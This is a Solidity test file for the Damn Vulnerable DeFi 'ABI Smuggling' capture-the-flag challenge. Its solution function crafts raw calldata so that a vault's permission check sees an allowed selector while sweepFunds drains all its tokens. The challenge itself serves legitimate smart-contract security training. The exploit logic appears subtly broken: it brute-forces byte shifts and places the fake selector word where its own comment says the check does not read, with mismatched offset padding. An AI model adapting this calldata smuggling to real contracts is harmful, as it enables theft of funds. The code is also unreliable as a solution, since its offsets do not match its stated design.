// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        // We are already prank'ing as `player` via the modifier.
        // Goal: call AuthorizedExecutor.execute(target=vault, actionData=bytes)
        // in a way that the permission check sees an ALLOWED selector (0xd9caed12)
        // at the fixed offset (4 + 32*3 = 100), while the ACTUAL actionData
        // decodes from a different offset and starts with the selector of
        // `sweepFunds(address,IERC20)` to drain the vault to `recovery`.

        // 1) Inner calldata: the real action we want the vault to self-call
        //    sweepFunds(recovery, IERC20(token))
        bytes memory inner = abi.encodeWithSelector(
            SelfAuthorizedVault.sweepFunds.selector,
            recovery,
            IERC20(address(token))
        );

        // Try different byte alignments of the allowed selector inside the 32-byte word
        bytes4 allowed = hex"d9caed12";
        bool success = false;
        // We'll try placing the 4-byte selector at every offset within the 32-byte word
        for (uint256 shift = 0; shift <= 28; ++shift) {
            // rebuild head for each attempt: execSel (4) + target (32) + offset (32)
            bytes4 execSel = AuthorizedExecutor.execute.selector;
            bytes memory headTry = abi.encodePacked(execSel);
            headTry = bytes.concat(headTry, bytes32(uint256(uint160(address(vault)))));
            uint256 offset = 0x80; // 128
            headTry = bytes.concat(headTry, bytes32(offset));

            // build fake 32-byte word with allowed placed at `shift`
            bytes memory prefix = new bytes(shift);
            bytes memory suffix = new bytes(28 - shift);
            bytes memory fakeWordTry = bytes.concat(prefix, abi.encodePacked(allowed), suffix);
            headTry = bytes.concat(headTry, fakeWordTry);

            // pad up to offset
            uint256 gapTry = offset - headTry.length;
            headTry = bytes.concat(headTry, new bytes(gapTry));

            // dynamic tail same as before
            bytes memory tailTry = bytes.concat(bytes32(inner.length), inner);
            uint256 remTry = tailTry.length % 32;
            if (remTry != 0) {
                tailTry = bytes.concat(tailTry, new bytes(32 - remTry));
            }

            bytes memory payloadTry = bytes.concat(headTry, tailTry);

            // Attempt call
            (bool ok, bytes memory returndata) = address(vault).call(payloadTry);
            if (ok) {
                success = true;
                console.log("Found working alignment shift=", shift);
                break;
            } else {
                // Print short diagnostic for first few attempts to avoid flooding
                if (shift < 4 || shift > 24) {
                    console.log("attempt shift=", shift, "failed, returndata:");
                    console.logBytes(returndata);
                }
            }
        }
        require(success, "execute call failed for all alignments");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
